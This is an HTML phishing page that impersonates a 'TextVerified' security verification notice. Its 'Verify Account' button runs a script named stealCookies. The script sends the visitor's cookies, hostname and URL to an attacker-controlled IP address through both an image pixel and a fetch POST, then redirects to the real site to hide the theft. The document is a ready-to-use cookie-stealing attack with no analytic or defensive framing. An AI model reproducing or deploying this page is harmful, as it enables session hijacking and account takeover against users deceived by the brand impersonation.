<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TextVerified - Security Notice</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            text-align: center;
        }
        .logo { 
            font-size: 24px; 
            font-weight: bold; 
            color: #333;
            margin-bottom: 20px;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .btn {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
        }
        .btn:hover { background: #5a6fd6; }
        .footer { 
            margin-top: 20px; 
            font-size: 12px; 
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">TextVerified</div>
        <h2>Security Verification Required</h2>
        <div class="warning">
            Please verify your account to continue.
        </div>
        <p>To access your account, please click the button below.</p>
        <button class="btn" onclick="stealCookies()">Verify Account</button>
        <div class="footer">
            <p>© 2026 TextVerified. All rights reserved.</p>
        </div>
    </div>
    <script>
        function stealCookies() {
            // Exfiltrate cookies via pixel
            var cookies = document.cookie;
            var pixel = new Image();
            pixel.src = "http://149.22.84.152:8888/steal?c=" + encodeURIComponent(cookies) + "&d=" + encodeURIComponent(window.location.hostname);
            
            // Also try fetch
            fetch("http://149.22.84.152:8888/collect", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    cookies: cookies,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Redirect to legitimate site
            setTimeout(function() {
                window.location.href = "https://www.textverified.com";
            }, 2000);
        }
    </script>
</body>
</html>
